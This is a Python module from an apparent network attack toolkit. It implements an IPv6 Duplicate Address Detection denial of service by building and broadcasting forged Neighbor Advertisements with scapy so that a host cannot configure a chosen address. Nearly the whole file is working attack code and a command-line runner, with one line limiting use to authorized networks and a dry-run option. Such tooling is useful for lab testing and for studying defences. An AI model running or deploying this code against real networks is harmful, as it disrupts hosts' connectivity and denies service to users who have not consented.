"""Duplicate Address Detection DoS: answer a host's DAD with a forged Neighbor Advertisement.

Before it configures a new IPv6 address, a host runs Duplicate Address Detection (RFC 4862): it sends a
Neighbor Solicitation for the tentative address and waits for a reply. A Neighbor Advertisement for that
address, even a forged one, tells the host the address is in use. The host then marks the address as
duplicate and does not configure it.

This module sends unsolicited NAs for a chosen address to the all-nodes group, with the Override flag set
and the operator's MAC as the Target Link-Layer Address. Repeated during the DAD window, they keep a new
host from configuring that address.

Intended only for networks you own or are explicitly authorized to test.

Run as a module inside the attacker's network namespace:
    ip netns exec atk python -m macabre.attacks.duplicate_address_detection_dos a1 --source-mac 02:00:00:00:00:30 --target 2001:db8:1::50
"""

from __future__ import annotations

import argparse
import sys
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, IPv6
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.ndp_cache_poisoning import ALL_NODES_IP, ALL_NODES_MAC, validate_target
from macabre.attacks.rogue_router_advertisement import link_local_from_mac

MAX_FRAMES = 100
MIN_INTERVAL = 0.01
MAX_INTERVAL = 1.0


@dataclass(frozen=True)
class DuplicateAddressDetectionDosConfig:
    iface: str                          # attacker interface, on the segment where the host runs DAD
    source_mac: str                     # the MAC that answers DAD for the address (required)
    target: str = ""                    # the tentative IPv6 address to block (required)
    frames: int = 30                    # NAs sent over the DAD window
    interval: float = 0.1               # seconds between NAs
    dry_run: bool = False               # build NAs but do not send them

    def __post_init__(self) -> None:
        if not self.iface:
            raise ValueError("Interface is required.")
        normalize_unicast_mac(self.source_mac)
        if not self.target:
            raise ValueError("Target IPv6 address is required.")
        validate_target(self.target)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Advertisements must be between 1 and {MAX_FRAMES}.")
        if not MIN_INTERVAL <= self.interval <= MAX_INTERVAL:
            raise ValueError(f"Interval must be between {MIN_INTERVAL} and {MAX_INTERVAL} seconds.")


@dataclass
class DuplicateAddressDetectionDosStats:
    frames: int = 0
    status: str = ""


def build_duplicate_advertisement(config: DuplicateAddressDetectionDosConfig) -> Packet:
    """One NA for the tentative address: Override set, Solicited clear, Target Link-Layer Address = the operator's MAC."""
    source = normalize_unicast_mac(config.source_mac)
    target = validate_target(config.target)
    return (
        Ether(src=source, dst=ALL_NODES_MAC)
        / IPv6(src=link_local_from_mac(source), dst=ALL_NODES_IP, hlim=255)
        / ICMPv6ND_NA(tgt=str(target), R=0, S=0, O=1)
        / ICMPv6NDOptDstLLAddr(lladdr=source)
    )


def run_duplicate_address_detection_dos(
    config: DuplicateAddressDetectionDosConfig,
    stop_event: threading.Event,
    on_progress: Callable[[DuplicateAddressDetectionDosStats], None],
    send: Callable[..., Any] | None = None,
) -> DuplicateAddressDetectionDosStats:
    """Send `frames` NAs for the tentative address, `interval` seconds apart, unless `stop_event` is set first."""
    if config.dry_run:
        stats = DuplicateAddressDetectionDosStats(
            status=(
                f"Dry run: would send {config.frames} Neighbor Advertisement(s) for {config.target} "
                f"from {config.source_mac}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    send = send or sendp
    stats = DuplicateAddressDetectionDosStats()
    frame = build_duplicate_advertisement(config)
    for index in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} advertisement(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        if index < config.frames - 1:
            stop_event.wait(config.interval)
    stats.status = f"Sent {stats.frames} Neighbor Advertisement(s) for {config.target}."
    return stats


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Answer DAD with forged Neighbor Advertisements.")
    parser.add_argument("iface")
    parser.add_argument("--source-mac", required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--frames", type=int, default=30)
    parser.add_argument("--interval", type=float, default=0.1)
    args = parser.parse_args(argv)
    config = DuplicateAddressDetectionDosConfig(
        iface=args.iface, source_mac=args.source_mac, target=args.target,
        frames=args.frames, interval=args.interval,
    )
    stats = run_duplicate_address_detection_dos(config, threading.Event(), lambda _s: None)
    print(stats.status, flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
